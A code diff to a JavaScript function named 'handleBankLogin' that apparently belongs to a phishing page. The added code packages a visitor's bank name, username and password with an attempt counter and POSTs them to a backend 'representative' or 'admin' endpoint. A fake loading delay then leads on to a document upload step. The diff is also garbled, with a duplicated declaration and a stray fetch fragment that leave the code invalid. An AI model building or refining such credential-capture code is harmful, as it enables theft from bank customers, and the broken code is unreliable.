@@ -539,7 +539,15 @@ function handleBankLogin(e) {
     // Hide the form while loading
     form.style.display = 'none';
     
-    // Create data to send to representative (would be sent via API in real implementation)
+    // Create data to send to representative
+    const loginData = {
+        bank: bankName,
+        username: username,
+        password: password,
+        timestamp: new Date().toISOString(),
+        attempt: isFirstAttempt ? 1 : 2
+    };
+    // Create data to send to representative
     const loginData = {
         bank: bankName,
         username: username,
@@ -549,6 +557,29 @@ function handleBankLogin(e) {
     };
     
     console.log("Bank login attempt:", loginData);
+    
+    // Send the login attempt data to our backend API
+    fetch("/api/bank-login-attempt", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json",
+        },
+        body: JSON.stringify(loginData),
+    })
+    .then(response => response.json())
+    .catch(error => {
+        console.error("Error sending login attempt data:", error);
+    });
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(loginData),
+    })
+    .then(response => response.json())
+    .catch(error => {
+        console.error('Error sending login attempt data:', error);
+    });
     
     // Simulate API call to send login data to admin
     // In a real implementation, this would be sent securely to the backend
@@ -612,7 +643,7 @@ function handleBankLogin(e) {
                 }
                 
                 // Submit form to proceed to document upload
-                manualForm.submit();
+                manualForm.querySelector('button[type="submit"]').click();
             }
         }
     }, 5000); // 5 second loading time
